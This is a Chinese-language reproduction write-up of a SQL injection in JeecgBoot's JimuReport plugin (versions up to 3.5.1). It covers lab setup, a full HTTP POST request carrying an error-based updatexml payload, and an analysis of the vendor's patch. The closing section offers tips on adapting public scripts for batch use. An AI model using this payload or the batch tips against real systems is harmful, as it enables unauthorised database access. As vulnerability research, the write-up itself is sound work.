## 简介

JeecgBoot的代码生成器是一种可以帮助开发者快速构建企业级应用的工具，它可以通过一键生成前后端代码，无需写任何代码，让开发者更多关注业务逻辑。

### 影响版本

Jeecg-Boot<=`3.5.1`

### 环境搭建

idea+

### 后端源码：

> <https://github.com/jeecgboot/jeecg-boot/archive/refs/tags/v3.5.0.zip>

### 前端源码：

> <https://github.com/jeecgboot/jeecgboot-vue3/archive/refs/tags/v3.5.0.zip>

安装`npm`，安装nodejs

> <https://nodejs.org/dist/v18.16.1/node-v18.16.1-x64.msi>

![image-20230630100857383](https://image.3001.net/images/20230721/1689900490_64b9d5ca054664aeea984.png!small)

![image-20230630100954115](https://image.3001.net/images/20230721/1689900490_64b9d5cae27e7a09286f5.png!small)

安装yarn

    
    
    npm install -g yarn

![image-20230630102534163](https://image.3001.net/images/20230721/1689900491_64b9d5cbcf5775444b5ec.png!small)

下载依赖

    
    
    yarn install  
    yarn run serve  //起服务

![image-20230630134805017](https://image.3001.net/images/20230721/1689900492_64b9d5cca8503f609112b.png!small)

由于是前后端分离，需要数据库导入表，使用navicat直接导入即可

![image-20230630134749348](https://image.3001.net/images/20230721/1689900493_64b9d5cd93ec063133353.png!small)

后端服务端搭建，使用idea搭建导入项目，修改数据库配置

![image-20230711102654282](https://image.3001.net/images/20230721/1689900494_64b9d5ceb5b537b26ad75.png!small)

配置server端npm服务

![image-20230711102503802](https://image.3001.net/images/20230721/1689900495_64b9d5cfeb738a14991ff.png!small)

配置好之后直接启动，访问

> <http://localhost:3100/login>

![image-20230711132237314](https://image.3001.net/images/20230721/1689900496_64b9d5d0e2013b6895060.png!small)

搭建成功

## 漏洞复现

前后端分离，后端端口8080 ，Payload：

    
    
    {"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}
    
    
    POST /jeecg-boot/jmreport/qurestSql HTTP/1.1  
    Host: localhost:8080  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0  
    Content-Type: application/json  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Content-Length: 128  
    ​  
    {"apiSelectId":"1316997232402231298","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}

![image-20230711135427631](https://image.3001.net/images/20230721/1689900497_64b9d5d1e08b1013268e3.png!small)

## 分析

漏洞产生点位于积木报表插件内，查看更新的3.5.1的版本更新

![image-20230711132911295](https://image.3001.net/images/20230721/1689900499_64b9d5d33a0abcf003ca5.png!small)

更改了72处的文件，其中需要注意`db/其他数据库/jeecgboot-sqlserver2019.sql`中重写了数据插入的方法

`jeecg-boot-base-core/src/main/java/org/jeecg/common/util/SqlInjectionUtil.java`中增加了对sql语句的正则

![image-20230711133319482](https://image.3001.net/images/20230721/1689900500_64b9d5d467d311d7b6765.png!small)

这个修复是针对于后端的SQL注入，`/sys/duplicate/check`

![image-20230711135705607](https://image.3001.net/images/20230721/1689900501_64b9d5d5bff44bcd51d52.png!small)

目前最新更新的3.5.1版本似乎依旧没有针对积木报表注入点儿的加固措施,修复时更换jar包

![image-20230711141329534](https://image.3001.net/images/20230721/1689900502_64b9d5d6db3ed9f7b8655.png!small)

目前积木官方的jar包已升级。

关注积木5月份的升级日志

> <http://jimureport.com/doc/log>

![image-20230711141443739](https://image.3001.net/images/20230721/1689900503_64b9d5d7e23fcec31d41b.png!small)

## 小结

github上有师傅们的脚本，但是如果要批量使用的话建议在修改一下response的内容，仅仅只有操作失败的报错的话会存在大批量的报错。

![image-20230711204157664](https://image.3001.net/images/20230721/1689900505_64b9d5d93e340a7ec7c3e.png!small)

所有自定义的if判断的回显都建议修改一下，如有错误欢迎指出。

